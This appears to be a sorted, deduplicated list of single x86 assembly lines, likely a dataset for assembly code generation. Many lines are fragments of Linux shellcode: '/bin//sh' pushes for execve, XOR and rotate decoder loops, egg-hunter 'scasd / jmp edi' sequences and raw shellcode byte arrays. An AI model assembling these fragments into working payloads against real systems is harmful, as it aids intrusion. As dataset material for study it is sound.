+push esp
+push esp
+push esp
+push len
+push long 0x68732f2f \n push long 0x6e69622f \n mov eax, esp
+push long 0x68732f2f \n push long 0x6e69622f \n mov ebx, esp
+push long 0x68732f2f \n push long 0x6e69622f \n mov ecx, esp
+push long 0x68732f2f \n push long 0x6e69622f \n mov edx, esp
+push name
+push offset printf_msg
+push ogin
+push sock_reg
+push sock_reg
+push sys_execve
+push word [edx]
+push word [edx]
+push word 0544o
+push word 0644o
+push word 0666q
+push word 0x02
+push word 0x0a
+push word 0x0a
+push word 0x0f27
+push word 0x1b6
+push word 0x1b6
+push word 0x1ff
+push word 0x2
+push word 0x2
+push word 0x2923
+push word 0x2e2e
+push word 0x3436
+push word 0x3582
+push word 0x3636
+push word 0x3905
+push word 0x3905
+push word 0x3930
+push word 0x401f
+push word 0x4255
+push word 0x462d
+push word 0x462d
+push word 0x5000
+push word 0x5445
+push word 0x5974
+push word 0x5c11
+push word 0x5c11
+push word 0x632d
+push word 0x632d
+push word 0x632d \n mov eax, esp
+push word 0x632d \n mov ebx, esp
+push word 0x632d \n mov ecx, esp
+push word 0x632d \n mov edi, esp
+push word 0x632d \n mov edx, esp
+push word 0x632d \n mov esi, esp
+push word 0x6465
+push word 0x662d
+push word 0x662d \n mov eax, esp
+push word 0x662d \n mov ebx, esp
+push word 0x662d \n mov ecx, esp
+push word 0x662d \n mov edi, esp
+push word 0x662d \n mov edx, esp
+push word 0x662d \n mov esi, esp
+push word 0x6666
+push word 0x6873
+push word 0x692d
+push word 0x697a
+push word 0x6d6f
+push word 0x6f64
+push word 0x6f64
+push word 0x7065
+push word 0x722d
+push word 0x7365
+push word 0x736e
+push word 0x776f
+push word 0x7773
+push word 0x7773
+push word 0x8223
+push word 0xaaaa
+push word 0xb315
+push word 0xc005
+push word 0xc005
+push word 0xffff
+push word 0xffff
+push word 1 \n mov eax, esp
+push word 10
+push word 100
+push word 17 \n mov edx, esp
+push word 2
+push word 2
+push word 2 \n mov ecx, esp
+push word 21 \n mov ebx, esp
+push word ax
+push word bx
+push word bx
+push word cx
+push zero_reg
+push zero_reg
+push_cmd:
+push_cmd:
+pushl $0x68732f2f
+pushl $0x6e69622f
+pushw $0x632d
+pushw 0x3905
+pushw 0x682d
+pushw 0x697a
+R1: \n inc esi
+R1: \n inc esi \n inc esi
+R1: \n pop esi
+R2: \n inc esi
+R2: \n inc esi \n inc esi
+re
+read:
+reading:
+real_number1 dd 1234
+real_number2 dd 123456
+realarray resq 10
+realarray resq 10
+ret
+ret
+ret
+ret
+ret
+ret
+rol byte [esi], 0x2
+rol byte [esi], 0x2
+rol byte [esi], 4
+rol edi, 1
+rol edi, 1
+rol edx, 0x4
+ror esi, 1
+rotate:
+S1: db 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80
+S2: db 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80
+S3: dw 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80
+S4: db 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80
+sar eax, 23
+sar eax, 31
+sar ebx, 31
+sar ecx, 2
+sar edx, 4
+scasd
+scasd
+scasd
+scasd
+scasd \ jnz _end \n jmp edi
+scasd \n jnz _end
+scasd \n jnz _end \n jmp edi
+scasd \n jnz _start
+scasd \n jnz _start \n jmp edi
+scasd \n jnz IncAddr
+scasd \n jnz IncAddr \n jmp edi
+scasd \n l1 IncAddr
+scasd \n l1 IncAddr \n jmp edi
+section .bss
+section .bss
+section .bss
+section .bss
+section .bss
+section .bss
+section .data
+section .data
+section .data
+section .data
+section .data
+section .data
+section .text
+section .text
+section .text
+section .text
+section .text
+section .text
+section .text
+set_argv:
+set_argv:
+set_mark:
+set_mark:
+setup:
+shell_ret:
+shellcode:
+shellcodelen equ $-shellcode
+shift_decode:
+shl al, 4
+shl cx, 1
+shl eax, 1
+shl eax, 16
+shl eax, 2
+shl eax, 5
+shl eax,2
+shl ebx, 1
+shl ebx, 2
+shl ecx, 1
+shl ecx, 2
+shl edi, 0x1
+shl edx, 1
+shl edx, 24
+shl edx, 9
+shl edx, 9
+shl esi, 0x1
+shr [var], 3
+shr ax, bl \n not word ax
+shr bl,4
+shr bx, cl \n not bx
+shr bx, dl \n not byte bl
+shr cx, al \n not cx
+shr dl, 1
+shr eax, 1
+shr eax, 16
+shr eax, 2
+shr ebx, 1
+shr ebx, 2
+shr ecx, 1
+shr ecx, 2
+shr edx, 1
+shr edx, 16
+shr edx, 2
+shr edx, byte 16
+shr edx, byte 24
+size: equ 1024
+size: equ 50000
+stage:
+start:
+stc
+str db 'hello',0
+str db 'hey',0
+string db 'test.txt'
+string: db '/bin/sh'
+string: db '/etc/passwd'
+string: db 'file.txt'
+string: db 'file1.txt'
+string: db 'prova.txt'
+string: db 'tmp.txt'
+sub [var], esi
+sub [var2], esi
+sub al, 0x13
+sub al, 0x41
+sub al, 1 \n jns l1
+sub al, 1 \n jnz l1
+sub al, 88
+sub al, 88
+sub al, ah
+sub ax, 1564
+sub ax, 1564
+sub ax, 1662
+sub ax, 1662
+sub ax, 1662
+sub ax, ax
+sub bl, 0x7
+sub bl, 0x7
+sub bl, 3
+sub bl, 3 \n jnz stage
+sub bl, 4 \n jns l2
+sub bl, 48
+sub bl, cl \n jnz l2
+sub bl,byte [esi]
+sub bx, 1634
+sub bx, 1634
+sub bx, 1634
+sub bx, 1663
+sub bx, 1663
+sub bx, 1663
+sub bx, bx
+sub bx, dx
+sub byte [buff],20h
+sub byte [ebp+ecx],20h
+sub byte [edi], 0x4 \n not byte [edi]
+sub byte [edi], 7 \n not byte [edi]
+sub byte [edi], 8 \n not byte [edi]
+sub byte [esi], 0x1 \n not byte [esi]
+sub byte [esi], 0x1 \n not byte [esi]
+sub byte [esi], 0x9 \n not byte [esi]
+sub byte [esi], 0xd
+sub byte [esi], 13
+sub byte [esi], 13
+sub byte [esi], 2 \n not byte [esi]
+sub cl, 1
+sub cl, bl \n jns l3
+sub cx, 0x7ff
+sub cx, 0x7ff
+sub dl, 5 \n jns l4
+sub dl, al
+sub dl, byte [esi]
+sub dx, 15444
+sub dx, 15444
+sub eax, [esp]
+sub eax, 0x013ffeff
+sub eax, 0x04feca01
+sub eax, 0x0efc3532
+sub eax, 0x2c3d2dff
+sub eax, 0x3217d6d2
+sub eax, 0x3bd04ede
+sub eax, 0x70445eaf
+sub eax, 216
+sub eax, 3
+sub eax, 3e716230
+sub eax, 5d455523
+sub eax, 5e5d7722
+sub eax, 8
+sub eax, 8
+sub eax, eax
+sub eax, ebx
+sub eax, ebx
+sub eax,20000h
+sub ebx, 0x2e2aa163
+sub ebx, 0x2e2aa163
+sub ebx, 2
+sub ebx, byte 3
+sub ebx, byte 3
+sub ebx, byte 8
+sub ebx, byte 8
+sub ecx, 0x04baca01
+sub ecx, 0x0b454440
+sub ecx, 0x1525152a
+sub ecx, 0x6374612e
+sub ecx, 1
+sub ecx, 23
+sub ecx, ecx
+sub ecx, ecx
+sub ecx, ecx
+sub edi, 0x44444444
+sub edi, 0xffffffdf
+sub edi, 1768009314
+sub edi, 1768009314
+sub edx, 4
+sub edx, edx
+sub esp, 0x24
+sub esp, 0x28
+sub esp, 12
+sub esp, 12
+sub esp, 4
+sub esp, 4
+sub esp, 4
+sub esp, 4
+sub esp, 4
+sub esp, 4
+sub esp, 4
+sub esp, 8
+sub esp, byte 0x1
+sys_execve equ 0x0b
+syscall_execve equ 11
+test al, al
+test al, al \n jz found \n inc ecx
+test al, al \n jz found \n inc ecx
+test ax, ax
+test ax, ax \n jnz exeunt \n jmp carryon
+test ax, ax \n jnz exeunt \n jmp carryon
+test bl, bl \n jz not_found
+test bl, bl \n jz not_found
+test cl, cl
+test dl, 0x1 \n jnz ready_to_proxy
+test dl, 0x1 \n jnz ready_to_proxy
+test eax, eax
+test eax, eax
+test eax, eax \n jnz _convert
+test eax, eax \n jnz _convert
+test eax, eax \n jnz _parent \n pop ecx
+test eax, eax \n jnz _parent \n pop ecx
+test eax, eax \n jnz _recv_http_request \n sub ecx, 0x6
+test eax, eax \n jnz _recv_http_request \n sub ecx, 0x6
+test eax, eax \n jnz checkforfile
+test eax, eax \n jnz checkforfile
+test eax, eax \n jnz do_next_accept
+test eax, eax \n jnz do_next_accept
+test eax, eax \n jnz exit_on_error
+test eax, eax \n jnz exit_on_error
+test eax, eax \n jnz l1
+test eax, eax \n jnz l1
+test eax, eax \n jnz l1 \n call myfunct
+test eax, eax \n jnz l1 \n call myfunct
+test eax, eax \n jnz l4 \n call search
+test eax, eax \n jnz l4 \n call search
+test eax, eax \n jnz short _parent
+test eax, eax \n jnz short _parent
+test eax, eax \n js _while_loop
+test eax, eax \n js _while_loop
+test eax, eax \n js close
+test eax, eax \n js close
+test eax, eax \n js old_dirent
+test eax, eax \n js old_dirent
+test eax, eax \n js short socket
+test eax, eax \n js short socket
+test eax, eax \n jz check_html
+test eax, eax \n jz check_html
+test eax, eax \n jz check_html \n jmp while
+test eax, eax \n jz check_html \n jmp while
+test eax, eax \n jz close
+test eax, eax \n jz close
+test eax, eax \n jz close \n mov ebx, edx
+test eax, eax \n jz close \n mov ebx, edx
+test eax, eax \n jz proc_name
+test eax, eax \n jz proc_name
+test eax, eax \n jz ready_to_proxy
+test eax, eax \n jz ready_to_proxy
+test eax, eax \n jz short loc_402B13
+test eax, eax \n jz short loc_402B13
+test eax, eax \n jz short loc_402C13
+test eax, eax \n jz short loc_402C13
+test eax, eax \n jz socket
+test eax, eax \n jz socket \n xor eax, eax
+test eax, eax \n jz socket \n xor eax, eax
+test eax, eax \n jz write \n xor eax, eax
+test eax, eax \n jz write \n xor eax, eax
+test ebx, ebx
+test ecx, ecx
+test si, 01h
+three:
+todo:
+total_students equ 50
+two:
+two:
+up:
+var db 32
+var db 64
+var_a db 232
+var_a: dd 0x0
+var_b db 'c'
+var2 db ?
+var2 db ?
+variablename1: resb 1
+variablename2: resw 1
+variablename3: resd 1
+word_table dw 134, 345, 564, 123
+word_value dw 300
+word1 word 65535
+word2 sword –32768
+word3 word ?
+wordvar: resw 1
+wrap_around:
+write_syscall equ 4
+write:
+writestring:
+writestring:
+x dw ?
+x dw ?
+xchg [ebp+16], ecx
+xchg eax, ebx
+xchg eax, ebx
+xchg eax, ebx
+xchg eax, ecx
+xchg eax, edx
+xchg eax, esi
+xchg eax, esi
+xchg ebx, eax
+xchg ebx, eax
+xchg ebx, eax
+xchg ebx, eax
+xchg ebx, ecx
+xchg ebx, edx
+xchg ebx, esp
+xchg ebx, esp
+xchg ecx, edx
+xchg ecx, edx
+xchg edi, eax
+xchg edi, eax
+xchg edx, eax
+xchg edx, eax
+xchg edx, ebx
+xchg esi, eax
+xchg esi, eax
+xchg esi, ebx
+xchg esp, esi
+xchg si, bx
+xor [ebx], word __flag_byte
+xor [ecx + 116], bh
+xor [ecx + 116], bh
+xor [ecx + 116], dh
+xor [ecx + 116], dh
+xor [ecx], bh
+xor [ecx], dh
+xor ah, ah
+xor ah, ah
+xor al, 0e9h
+xor al, 0x30
+xor al, 0x41
+xor ax, 0x3041
+xor ax, 0x4f73
+xor ax, 0x539 \n jz decoded_shellcode
+xor ax, 0x7777
+xor ax, ax
+xor ax, ax
+xor bl, 0xbb
+xor bl, 0xbb
+xor bx,bx
+xor byte [esi + ecx - 1], 0x3
+xor byte [esi], cl
+xor cl, 0x32 \n jz short EncodedShellcode
+xor cl, 0xaa
+xor cl, 0xaa
+xor dl, 0xbb
+xor dl, 0xbb
+xor eax, [edi]
+xor eax, [esi]
+xor eax, 0x58494741
+xor eax, 0x58494741
+xor eax, 0x6e696230
+xor eax, 0x7575
+xor eax, 0xffffffff
+xor eax, eax
+xor eax, eax
+xor eax, eax
+xor eax, eax
+xor eax, eax
+xor eax, eax
+xor eax, eax
+xor eax, eax
+xor eax, eax
+xor eax, eax \n cmp edx, eax \n je l3
+xor eax, eax \n cmp edx, eax \n jne l3
+xor eax, eax \n mov al, [esi+1]
+xor eax, eax \n mov al, 0x3
+xor eax, eax \n mov al, 0x4
+xor eax, eax \n mov al, 5
+xor eax, eax \n push eax
+xor eax, eax \n push eax
+xor eax, eax \n xor ebx, ebx \n xor ecx, ecx \n xor edx, edx
+xor eax, eax \n xor ebx, ebx \n xor ecx, ecx \n xor edx, edx
+xor eax, eax \n xor ebx, ebx \n xor edx, edx
+xor eax, ebx
+xor eax, ebx
+xor eax, edi
+xor eax, esi
+xor ebx, ebp
+xor ebx, ebx
+xor ebx, ebx
+xor ebx, ebx
+xor ebx, ebx
+xor ebx, ebx
+xor ebx, ebx
+xor ebx, ebx
+xor ebx, ebx \n cmp eax, ebx \n je exit
+xor ebx, ebx \n mov bl, [esi+1]
+xor ebx, ebx \n mov bl, [esi+1]
+xor ebx, ebx \n mov bl, 0x3
+xor ebx, ebx \n mov bl, 2
+xor ebx, ebx \n mov bl, 5
+xor ebx, ebx \n mul ebx
+xor ebx, ebx \n mul ebx
+xor ebx, ebx \n mul ebx
+xor ebx, ebx \n mul ebx
+xor ebx, ebx \n mul ebx
+xor ebx, ebx \n mul ebx
+xor ebx, ebx \n push ebx
+xor ebx, ebx \n push ebx
+xor ebx, ebx \n xor edx, edx
+xor ebx, word __flag_byte
+xor ecx, dh
+xor ecx, ecx
+xor ecx, ecx
+xor ecx, ecx
+xor ecx, ecx
+xor ecx, ecx
+xor ecx, ecx
+xor ecx, ecx
+xor ecx, ecx
+xor ecx, ecx \n cmp ebx, ecx \n je l1
+xor ecx, ecx \n mov cl, [esi+1]
+xor ecx, ecx \n mov cl, [esi+1]
+xor ecx, ecx \n mov cl, 0x4
+xor ecx, ecx \n mul ecx
+xor ecx, ecx \n mul ecx
+xor ecx, ecx \n mul ecx
+xor ecx, ecx \n mul ecx
+xor ecx, ecx \n push ecx
+xor ecx, ecx \n push ecx
+xor ecx, ecx \n push ecx
+xor edi, edi
+xor edi, edi
+xor edx, ecx \n mov dl, [esi+1]
+xor edx, ecx \n mov dl, [esi+1]
+xor edx, edx
+xor edx, edx
+xor edx, edx
+xor edx, edx
+xor edx, edx
+xor edx, edx
+xor edx, edx
+xor edx, edx
+xor edx, edx
+xor edx, edx
+xor edx, edx \n cmp ecx, edx \n je l2
+xor edx, edx \n mov dl, 0x3
+xor edx, edx \n mov dl, 0x4
+xor edx, edx \n mov dl, 2
+xor edx, edx \n mul edx
+xor edx, edx \n mul edx
+xor edx, edx \n push edx
+xor edx, edx \n push edx
+xor edx, edx \n push edx
+xor esi, esi
+xor esi, esi
+xor esi, esi
+xor zero_reg, zero_reg
+y dd 3000
+y: dd 0x0
+ymmval: resw 1
+z dd 1, 2, 3
+z dd 1,2,3
+z: dd 0x0
